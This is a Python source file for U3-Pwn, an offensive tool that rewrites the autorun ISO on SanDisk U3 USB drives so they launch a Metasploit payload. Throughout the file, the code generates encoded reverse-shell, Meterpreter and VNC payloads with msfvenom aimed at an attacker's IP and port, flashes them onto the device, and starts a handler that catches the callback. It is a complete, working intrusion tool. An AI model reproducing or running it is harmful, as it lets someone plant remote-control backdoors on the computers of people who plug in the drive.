#!/usr/bin/env python3
#################################################################################
#                ____                     _ __                                 #
#     ___  __ __/ / /__ ___ ______ ______(_) /___ __                           #
#    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                           #
#   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                            #
#                                            /___/ team                        #
#                                                                              #
# U3-Pwn                                                                       #
#                                                                              #
# DATE                                                                         #
# 10/05/2013                                                                   #
#                                                                              #
# DESCRIPTION                                                                  #
# U3-Pwn is a tool designed to automate injecting executables to Sandisk       #
# smart usb devices with default U3 software install. This is performed by     #
# removing the original iso file from the device and creating a new iso        #
# with autorun features.                                                       #
#                                                                              #
# REQUIREMENTS                                                                  #
# - Metasploit                                                                 #
# - U3-Tool                                                                    #
# - Python-2.7                                                                 #
#                                                                              #
# AUTHOR                                                                       #
# Zy0d0x - http://www.nullsecurity.net/                                        #
#                                                                              #
################################################################################
import subprocess
import pexpect
import time
import os
import sys
import shutil
import socket

try:
    import banner
except ImportError as error:
    print('\n[-] Failed to import banner module\n')
    banner = None  # define banner as None to avoid NameError later
    print(error)

define_path = os.getcwd()
sys.path.append(f"{define_path}/src/")

def find_device():
    print(" Detecting Device...\n")
    u3_ids = ['5406', '5408', '5151', '5530', '5535', '550a', '540e']
    for dev_id in u3_ids:
        try:
            device = subprocess.check_output(f"lsusb -d 0781:{dev_id}", shell=True, text=True)
            print(f" Device Found: {device.strip()}")
        except subprocess.CalledProcessError:
            pass

def find_partition():
    print(" Detecting Partitions...")
    time.sleep(2)
    with open("/proc/partitions", "r") as partitionsFile:
        lines = partitionsFile.readlines()[2:]

        for line in lines:
            words = [x.strip() for x in line.split()]
            if len(words) < 4:
                continue
            minorNumber = int(words[1])
            deviceName = words[3]
            if minorNumber % 16 == 0:
                path = f"/sys/class/block/{deviceName}"
                if os.path.islink(path) and "/usb" in os.path.realpath(path):
                    if deviceName.startswith("sd"):
                        print(f"\n Partition Found: /dev/{deviceName}1")
                        return deviceName
    return None

def choose_payload():
    shell_codes = [
        'windows/shell/reverse_tcp',
        'windows/meterpreter/reverse_tcp',
        'windows/vncinject/reverse_tcp',
        'windows/shell/bind_tcp',
        'windows/x64/shell/reverse_tcp',
        'windows/meterpreter/reverse_https',
        'windows/meterpreter/reverse_dns'
    ]

    print('''\n Choose a payload:
 1. Windows Shell Reverse_TCP
 2. Windows Reverse_TCP Meterpreter
 3. Windows Reverse_TCP VNC DLL
 4. Windows Bind Shell
 5. Windows Meterpreter Reverse_TCP X64
 6. Windows Meterpreter Reverse HTTPS
 7. Windows Meterpreter Reverse DNS''')

    while True:
        try:
            payload = int(input(" Enter number: ").strip())
            if 1 <= payload <= len(shell_codes):
                return shell_codes[payload - 1]
        except ValueError:
            pass
        print(" Invalid input. Try again.")

def choose_encoder():
    encoders = [
        'x86/shikata_ga_nai',
        'x86/alpha_mixed',
        'x86/alpha_upper',
        'x86/call4_dword_xor',
        'x86/countdown',
        'x86/fnstenv_mov',
        'x86/jmp_call_additive'
    ]

    print('''\n Choose an encoder:
 1. shikata_ga_nai
 2. alpha_mixed
 3. alpha_upper
 4. call4_dword_xor
 5. countdown
 6. fnstenv_mov
 7. jmp_call_additive''')

    while True:
        try:
            encode = int(input(" Enter number: ").strip())
            if 1 <= encode <= len(encoders):
                return encoders[encode - 1]
        except ValueError:
            pass
        print(" Invalid input. Try again.")

def get_network_info():
    while True:
        addr = input(' Please Enter IP address: ').strip()
        try:
            socket.inet_aton(addr)
        except socket.error:
            print(" Invalid IP address.")
            continue

        port = input(' Please Enter Port Number: ').strip()
        if port.isdigit():
            return addr, port
        else:
            print(" Invalid port number.")

def generate_shellcode(payload, encoder, addr, port):
    print(' Generating Shellcode...')
    os.makedirs('resource', exist_ok=True)
    os.makedirs('backup', exist_ok=True)

    output = subprocess.run(
        f"msfvenom -p {payload} LHOST={addr} LPORT={port} "
        f"EXITFUNC=thread -e {encoder} -f raw | msfvenom -a x86 -e x86/alpha_mixed "
        f"-f raw BufferRegister=EAX -o resource/payload.txt",
        shell=True, stderr=subprocess.PIPE
    )

    if output.returncode != 0:
        print(" Error generating shellcode.")
        print(output.stderr.decode())
        sys.exit(1)

    with open('resource/payload.txt', 'r') as alpha:
        text = alpha.readline()

    with open('resource/LaunchU3.bat', 'w') as file:
        file.write('LaunchU3.exe ' + text)

    shutil.copy('backup/LaunchU3.exe', 'resource/LaunchU3.exe')

def make_iso_and_write(deviceName):
    subprocess.run('genisoimage -volid "U3 System" -o "resource/U3 System.iso" resource/', shell=True)

    print(f" Creating a new partition on /dev/{deviceName}")
    child = pexpect.spawn(f'u3-tool -v -p 1302528 /dev/{deviceName}')
    child.sendline('y')
    time.sleep(5)

    print(f" Replacing ISO on /dev/{deviceName}")
    subprocess.run(f'u3-tool -v -l "resource/U3 System.iso" /dev/{deviceName}', shell=True)

def cleanup():
    for f in ['resource/LaunchU3.exe', 'resource/U3 System.iso', 'resource/LaunchU3.bat', 'resource/payload.txt']:
        try:
            os.remove(f)
        except FileNotFoundError:
            pass

def start_listener(payload, port):
    response = input(' Do you want to start a listener (yes/no)? ').strip().lower()
    if response in ['yes', 'y']:
        subprocess.run(f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST 0.0.0.0; set LPORT {port}; exploit'", shell=True)
    else:
        print(" Generation complete. Exiting...")

def main():
    try:
        banner.print_banner()
        find_device()
        time.sleep(2)

        banner.print_banner()
        deviceName = find_partition()
        if not deviceName:
            print(" No USB partitions found. Exiting.")
            return

        time.sleep(2)
        banner.print_banner()
        payload = choose_payload()

        banner.print_banner()
        encoder = choose_encoder()

        banner.print_banner()
        addr, port = get_network_info()

        banner.print_banner()
        generate_shellcode(payload, encoder, addr, port)
        make_iso_and_write(deviceName)

        banner.print_banner()
        cleanup()
        start_listener(payload, port)

    except KeyboardInterrupt:
        print(" Interrupted by user. Exiting.")
        sys.exit(0)
    except Exception as e:
        print(f" [-] Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
